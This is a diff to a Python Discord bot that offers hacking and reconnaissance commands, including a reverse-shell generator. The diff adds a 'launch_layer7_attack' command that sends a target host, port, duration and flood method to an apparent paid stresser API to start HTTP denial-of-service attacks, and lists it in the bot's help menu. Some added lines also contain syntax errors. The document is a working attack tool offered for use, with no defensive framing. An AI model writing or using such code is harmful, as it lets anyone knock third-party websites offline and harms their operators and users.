@@ -57,7 +57,7 @@ async def h(ctx):
         '.getRefs\n .scanIp\n .whois\n .resolveCF\n .censysCertificates\n .censysRaw\n .censysData\n .censysIp\n ',
         '.traceroute\n .nslookup\n .nmap\n .b64encode\n .b64decode\n .urlDecode\n .githubSearch\n .exploits\n ',
         '.terminal\n .sqliTest\n .searchVT\n .vtSampleReport\n .vtSampleDownload\n .dnsDumpster\n .shodanSearch\n ',
-        '.nmapPortScan')
+        '.nmapPortScan\n .launch_layer7_attack')
     embed = discord.Embed(
         title="List of all commands that can be used",
         description="Command list",
@@ -106,6 +106,7 @@ async def h(ctx):
     embed2.add_field(name='.dnsDumpster', value='Use dnsDumpster unoficiall api', inline=True)
     embed2.add_field(name='.shodanSearch', value='Use shodan to find IOT Device IPs', inline=True)
     embed2.add_field(name='.nmapPortScan' value='Run an NMAP Port scan', inline=True)
+    embed2.add_field(name='.launch_layer7_attack' value='Example: <api_key> <host> <port> <time> <method> (Methods: AUTOMATION, BYPASS, SOCKET, SPAMMER, BYPASS, ELITE)', inline=True)
     await ctx.send(embed=embed2)
 
 
@@ -226,6 +227,47 @@ async def genShellPy(ctx, ip=None, port=None):
         await ctx.send('Please enter a port!')
 
     await ctx.send(pyBeginning + pyShell)
+
+@bot.command()
+def launch_layer7_attack(api_key, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
+    """
+    AUTOMATION 	HTTP 	Effective method for HTTP/HTTPs
+    BYPASS 	HTTP 	Effective method for HTTP/HTTPs
+    SOCKET 	HTTP 	Socket method for mass requests
+    SPAMMER 	HTTP 	Spammer method for mass requests
+    BYPASS 	HTTP 	Powerful layer 7 attack.
+    SOCKET 	HTTP 	Powerful layer 7 attack.
+    AUTOMATION 	HTTP 	Powerful layer 7 attack.
+    SPAMMER 	HTTP 	Powerful layer 7 attack.
+    ELITE 	HTTP 	Powerful layer 7 attack.
+    """
+    api_url = "https://stresse.ru/api/api.php"
+    params = {
+        "key": api_key,
+        "action": "layer7",
+        "host": host,
+        "port": port,
+        "time": time,
+        "method": method,
+        "postdata": postdata,
+        "cookie": cookie,
+        "referer": referer,
+        "useragent": useragent,
+        "req": req,
+        "delay": delay,
+        "con": con
+    }
+
+    response = requests.get(api_url, params=params)
+
+    if response.status_code == 200:
+        response_json = response.json()
+        if response_json.get("status"):
+            return f"Success: {response_json['body']}, Attack ID: {response_json['attack_id']}"
+        else:
+            return f"API Error: {response_json.get('error', 'Unknown error')}"
+    else:
+        return f"Your connection to API failed (Error {response.status_code}), check your connection and try again"
 
 
 @bot.command()
